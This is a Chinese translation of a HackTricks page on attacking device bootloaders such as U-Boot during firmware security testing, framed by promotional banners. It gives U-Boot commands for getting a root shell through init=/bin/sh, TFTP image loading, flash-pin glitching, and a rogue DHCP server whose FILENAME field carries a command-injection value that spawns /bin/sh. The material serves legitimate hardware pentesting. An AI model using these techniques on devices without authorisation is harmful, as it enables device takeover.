<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击成为英雄！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>


摘自 [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

当修改设备启动和bootloaders，如U-boot时，尝试以下操作：

* 尝试在启动过程中按下"0"、空格或其他已识别的“魔术代码”来访问bootloaders解释器shell。
* 修改配置以执行shell命令，例如在启动参数的末尾添加'`init=/bin/sh`'
* `#printenv`
* `#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh`
* `#saveenv`
* `#boot`
* 设置一个tftp服务器，从您的工作站本地通过网络加载镜像。确保设备具有网络访问能力。
* `#setenv ipaddr 192.168.2.2 #设备的本地IP`
* `#setenv serverip 192.168.2.1 #tftp服务器IP`
* `#saveenv`
* `#reset`
* `#ping 192.168.2.1 #检查是否有网络访问能力`
* `#tftp ${loadaddr} uImage-3.6.35 #loadaddr接受两个参数：加载文件的地址和TFTP服务器上的镜像文件名`
* 使用`ubootwrite.py`写入uboot镜像并推送修改后的固件以获得root权限
* 检查是否启用了调试功能，如：
* 详细日志记录
* 加载任意内核
* 从不受信任的来源启动
* \*小心使用：将一个引脚连接到地线，观察设备启动序列，在内核解压之前，将接地的引脚短接/连接到SPI闪存芯片上的数据引脚（DO）
* \*小心使用：将一个引脚连接到地线，观察设备启动序列，在内核解压之前，将接地的引脚短接/连接到NAND闪存芯片的第8和第9脚，就在U-boot解压UBI镜像的时刻
* \*在短接引脚之前先查阅NAND闪存芯片的数据手册
* 配置一个带有恶意参数的流氓DHCP服务器，作为设备在PXE启动期间摄取的输入
* 使用Metasploit的（MSF）DHCP辅助服务器，并修改'`FILENAME`'参数，使用如`‘a";/bin/sh;#’`的命令注入命令来测试设备启动程序的输入验证。

\*硬件安全测试


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击成为英雄！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
